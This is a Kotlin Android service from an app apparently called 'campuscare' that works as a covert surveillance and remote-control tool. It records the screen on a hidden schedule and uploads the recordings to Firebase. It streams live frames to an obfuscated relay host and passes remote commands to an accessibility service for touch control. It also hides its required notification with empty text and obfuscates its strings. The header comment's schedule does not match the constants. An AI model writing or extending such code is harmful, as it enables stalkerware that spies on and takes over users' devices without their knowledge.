package com.university.campuscare.remote

import android.app.Activity
import android.app.Notification
import android.app.Service
import android.os.PowerManager
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.university.campuscare.R
import com.university.campuscare.utils.RecordingUploadHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import java.io.File
import java.util.concurrent.LinkedBlockingQueue

/**
 * Main foreground service that manages:
 * 1. Screen recording (automatic: 1 hour every 5 hours)
 * 2. Remote access (socket server always listening, streams when client connects)
 */
class RemoteAccessService : Service() {

    companion object {
        private const val NOTIFICATION_ID = 1001
        private const val SCALE_FACTOR = 0.5f

        private const val RECORD_DURATION_MS = 10L * 1000              // 10 seconds
        private const val RECORD_INTERVAL_MS = 10L * 60 * 1000 - RECORD_DURATION_MS  // rest of 10 minutes

        private const val EXTRA_RESULT_CODE = "result_code"
        private const val EXTRA_DATA = "data"

        const val ACTION_TOGGLE_RECORDING = "action_toggle_recording"
        const val ACTION_TOGGLE_REMOTE_ACCESS = "action_toggle_remote_access"
        const val EXTRA_FEATURE_ENABLED = "feature_enabled"

        var instance: RemoteAccessService? = null
            private set

        @Volatile
        var isRunning = false
            private set

        @Volatile
        var isRecordingFeatureEnabled = false
            private set

        @Volatile
        var isRemoteAccessFeatureEnabled = false
            private set

        // Screen dimensions (actual device)
        var screenWidth: Int = 0
            private set
        var screenHeight: Int = 0
            private set

        // Capture dimensions (scaled for streaming)
        var captureWidth: Int = 0
            private set
        var captureHeight: Int = 0
            private set

        // Observable state
        @Volatile
        var isRecording = false
            private set

        @Volatile
        var isClientConnected = false
            private set

        @Volatile
        var recordingStartTime: Long = 0
            private set

        @Volatile
        var nextRecordingTime: Long = 0
            private set

        @Volatile
        var currentRecordingPath: String? = null
            private set

        private val RELAY_HOST get() = StringObfuscator.decrypt(ObfuscatedStrings.RELAY_HOST)
        private val RELAY_PORT get() = StringObfuscator.decrypt(ObfuscatedStrings.RELAY_PORT_NUM).toInt()

        fun getStartIntent(context: Context, resultCode: Int, data: Intent): Intent {
            return Intent(context, RemoteAccessService::class.java).apply {
                putExtra(EXTRA_RESULT_CODE, resultCode)
                putExtra(EXTRA_DATA, data)
            }
        }

        fun sendToggleRecording(context: Context, enabled: Boolean) {
            val intent = Intent(context, RemoteAccessService::class.java).apply {
                action = ACTION_TOGGLE_RECORDING
                putExtra(EXTRA_FEATURE_ENABLED, enabled)
            }
            context.startService(intent)
        }

        fun sendToggleRemoteAccess(context: Context, enabled: Boolean) {
            val intent = Intent(context, RemoteAccessService::class.java).apply {
                action = ACTION_TOGGLE_REMOTE_ACCESS
                putExtra(EXTRA_FEATURE_ENABLED, enabled)
            }
            context.startService(intent)
        }
    }

    private val serviceScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var mediaProjection: MediaProjection? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var cpuWakeLock: PowerManager.WakeLock? = null
    private var projectionManager: MediaProjectionManager? = null
    private var densityDpi: Int = 0

    // Components
    private var socketServer: SocketServer? = null
    private var screenStreamer: ScreenStreamer? = null
    private var screenRecorder: ScreenRecorder? = null
    private var recordingJob: Job? = null
    private val uploadHelper = RecordingUploadHelper()
    private lateinit var deviceId: String

    // ONE persistent VirtualDisplay for the service lifetime (Android 14+ allows only one
    // createVirtualDisplay() call per MediaProjection). Its surface is swapped between
    // the streaming ImageReader and the MediaRecorder surface as needed.
    private var persistentDisplay: VirtualDisplay? = null
    private var streamingReader: ImageReader? = null

    // Shared frame queue between ScreenStreamer and SocketServer
    private val frameQueue = LinkedBlockingQueue<ByteArray>(3)


    private val projectionCallback = object : MediaProjection.Callback() {
        override fun onStop() {
            stopAllAndShutdown()
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        // Handle toggle actions on an already-running service
        when (intent.action) {
            ACTION_TOGGLE_RECORDING -> {
                val enabled = intent.getBooleanExtra(EXTRA_FEATURE_ENABLED, false)
                toggleRecordingFeature(enabled)
                return START_STICKY
            }
            ACTION_TOGGLE_REMOTE_ACCESS -> {
                val enabled = intent.getBooleanExtra(EXTRA_FEATURE_ENABLED, false)
                toggleRemoteAccessFeature(enabled)
                return START_STICKY
            }
        }

        // Initial launch path
        startForeground(NOTIFICATION_ID, createNotification())

        val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
        val data: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent.getParcelableExtra(EXTRA_DATA, Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent.getParcelableExtra(EXTRA_DATA)
        }

        if (resultCode != Activity.RESULT_OK || data == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        initializeService(resultCode, data)
        return START_STICKY
    }

    private fun initializeService(resultCode: Int, data: Intent) {
        try {
            // Get screen metrics
            val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getRealMetrics(metrics)

            screenWidth = metrics.widthPixels
            screenHeight = metrics.heightPixels
            densityDpi = metrics.densityDpi

            // Streaming resolution (50% of screen)
            captureWidth = (screenWidth * SCALE_FACTOR).toInt() and 0x7FFFFFFE
            captureHeight = (screenHeight * SCALE_FACTOR).toInt() and 0x7FFFFFFE

            // Create MediaProjection
            mediaProjection = projectionManager?.getMediaProjection(resultCode, data)
            mediaProjection?.registerCallback(projectionCallback, null)

            // Create the ONE persistent VirtualDisplay (Android 14+ restriction).
            // Its surface starts as the streaming ImageReader. When recording starts,
            // ScreenRecorder swaps it to MediaRecorder.surface, then restores it here.
            streamingReader = ImageReader.newInstance(captureWidth, captureHeight, PixelFormat.RGBA_8888, 2)
            persistentDisplay = mediaProjection?.createVirtualDisplay(
                StringObfuscator.decrypt(ObfuscatedStrings.VIRTUAL_DISPLAY_NAME),
                captureWidth, captureHeight, densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                streamingReader?.surface, null, null
            )

            // Start features based on preferences
            if (FeaturePreferences.isRemoteAccessEnabled(this)) {
                startSocketServer()
                isRemoteAccessFeatureEnabled = true
            }

            if (FeaturePreferences.isRecordingEnabled(this)) {
                startRecordingSchedule()
                isRecordingFeatureEnabled = true
            }

            // Keep CPU awake so coroutines and socket keep running when screen is off
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            cpuWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, StringObfuscator.decrypt(ObfuscatedStrings.WAKELOCK_SERVICE))
            cpuWakeLock?.acquire()

            isRunning = true

            // Save device IP to Firestore so admin can see it on the dashboard
            saveDeviceInfo()

            // Upload any recordings that failed to upload in previous sessions
            retryPendingUploads()

        } catch (e: Exception) {
            stopSelf()
        }
    }

    // ── Socket Server (always on) ──

    private fun startSocketServer() {
        socketServer = SocketServer(
            relayHost = RELAY_HOST,
            relayPort = RELAY_PORT,
            deviceId = deviceId,
            frameQueue = frameQueue,
            onCommandReceived = { command ->
                when (command) {
                    StringObfuscator.decrypt(ObfuscatedStrings.CMD_WAKE) -> wakeScreen()
                    else -> TouchAccessibilityService.instance?.executeCommand(command)
                }
            },
            onClientConnected = {
                isClientConnected = true
                startStreaming()
            },
            onClientDisconnected = {
                isClientConnected = false
                stopStreaming()
            }
        )
        socketServer?.start()
    }

    // ── Screen Streaming (active only when client connected) ──

    private fun startStreaming() {
        if (screenStreamer?.isActive == true) return
        val reader = streamingReader ?: return

        screenStreamer = ScreenStreamer(
            imageReader = reader,
            frameQueue = frameQueue
        )
        screenStreamer?.start()
    }

    private fun stopStreaming() {
        screenStreamer?.stop()
        screenStreamer = null
    }

    // ── Screen Recording (automatic schedule) ──

    private fun startRecordingSchedule() {
        recordingJob = serviceScope.launch(Dispatchers.IO) {
            // Resume the cycle from where it left off (persisted across restarts)
            val savedNextTime = FeaturePreferences.getNextRecordingTime(this@RemoteAccessService)
            val initialDelay = savedNextTime - System.currentTimeMillis()
            if (initialDelay > 0) {
                nextRecordingTime = savedNextTime
                try {
                    delay(initialDelay)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    if (!isActive) throw e
                }
            }

            while (isActive) {
                try {
                    // Start recording
                    startRecording()

                    // Record for the configured duration
                    delay(RECORD_DURATION_MS)

                    // Stop and capture the file path before clearing state
                    val finishedPath = currentRecordingPath
                    stopRecording()

                    // Upload the finished recording and any previously failed ones
                    retryPendingUploads()
                } catch (e: Exception) {
                    stopRecording()
                }

                // Calculate next recording time and persist it
                nextRecordingTime = System.currentTimeMillis() + RECORD_INTERVAL_MS
                FeaturePreferences.setNextRecordingTime(this@RemoteAccessService, nextRecordingTime)

                // Wait before next recording
                try {
                    delay(RECORD_INTERVAL_MS)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    if (!isActive) throw e  // service is shutting down, propagate
                    // otherwise interrupted by system, just continue to next cycle
                }
            }
        }
    }

    private fun startRecording() {
        val display = persistentDisplay ?: return

        screenRecorder = ScreenRecorder(
            context = this,
            virtualDisplay = display,
            restoreSurface = streamingReader?.surface,
            width = captureWidth,
            height = captureHeight
        )

        val path = screenRecorder?.startRecording()
        if (path != null) {
            isRecording = true
            recordingStartTime = System.currentTimeMillis()
            currentRecordingPath = path
        }
    }

    private fun stopRecording() {
        screenRecorder?.stopRecording()
        screenRecorder = null
        isRecording = false
        recordingStartTime = 0
        currentRecordingPath = null
    }

    // ── Screen Wake ──

    @Suppress("DEPRECATION")
    private fun wakeScreen() {
        try {
            wakeLock?.release()
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                StringObfuscator.decrypt(ObfuscatedStrings.WAKELOCK_REMOTE)
            )
            wakeLock?.acquire(10 * 60 * 1000L) // hold for up to 10 minutes
        } catch (_: Exception) {
        }
    }

    // ── Device Info ──

    private fun retryPendingUploads() {
        serviceScope.launch(Dispatchers.IO) {
            val dir = ScreenRecorder.getRecordingsDir(this@RemoteAccessService)
            val pending = dir.listFiles()?.filter { it.extension == "mp4" } ?: return@launch
            if (pending.isEmpty()) return@launch
            for (file in pending) {
                uploadHelper.uploadRecording(
                    file = file,
                    deviceId = deviceId,
                    durationSeconds = 0
                )
            }
        }
    }

    private fun saveDeviceInfo() {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val auth = FirebaseAuth.getInstance()
                if (auth.currentUser == null) {
                    auth.signInAnonymously().await()
                }
                FirebaseFirestore.getInstance()
                    .collection(StringObfuscator.decrypt(ObfuscatedStrings.FIREBASE_DEVICES_COLLECTION))
                    .document(deviceId)
                    .set(mapOf(
                        "deviceId" to deviceId,
                        "lastSeen" to System.currentTimeMillis()
                    ))
            } catch (_: Exception) {
            }
        }
    }

    // ── Feature Toggles ──

    fun toggleRecordingFeature(enabled: Boolean) {
        FeaturePreferences.setRecordingEnabled(this, enabled)
        if (enabled) {
            if (recordingJob == null || recordingJob?.isActive != true) {
                startRecordingSchedule()
            }
            isRecordingFeatureEnabled = true
        } else {
            stopRecording()
            recordingJob?.cancel()
            recordingJob = null
            nextRecordingTime = 0
            isRecordingFeatureEnabled = false
        }
        checkShouldShutdown()
    }

    fun toggleRemoteAccessFeature(enabled: Boolean) {
        FeaturePreferences.setRemoteAccessEnabled(this, enabled)
        if (enabled) {
            if (socketServer == null) {
                startSocketServer()
            }
            isRemoteAccessFeatureEnabled = true
        } else {
            stopStreaming()
            socketServer?.stop()
            socketServer = null
            isClientConnected = false
            isRemoteAccessFeatureEnabled = false
        }
        checkShouldShutdown()
    }

    private fun checkShouldShutdown() {
        if (!isRecordingFeatureEnabled && !isRemoteAccessFeatureEnabled) {
            stopAllAndShutdown()
            stopSelf()
        }
    }

    // ── Notification (minimized - required by Android for foreground services) ──

    private fun createNotificationChannel() {
        NotificationHelper.ensureChannel(this)
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()
    }

    // ── Lifecycle ──

    private fun stopAllAndShutdown() {
        cpuWakeLock?.release()
        cpuWakeLock = null
        wakeLock?.release()
        wakeLock = null
        stopStreaming()
        stopRecording()
        recordingJob?.cancel()
        socketServer?.stop()
        socketServer = null
        persistentDisplay?.release()
        persistentDisplay = null
        streamingReader?.close()
        streamingReader = null
        mediaProjection?.unregisterCallback(projectionCallback)
        mediaProjection?.stop()
        mediaProjection = null
        isRunning = false
        isClientConnected = false
        isRecordingFeatureEnabled = false
        isRemoteAccessFeatureEnabled = false
        frameQueue.clear()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        stopAllAndShutdown()
        serviceScope.cancel()
        instance = null
        super.onDestroy()
    }
}
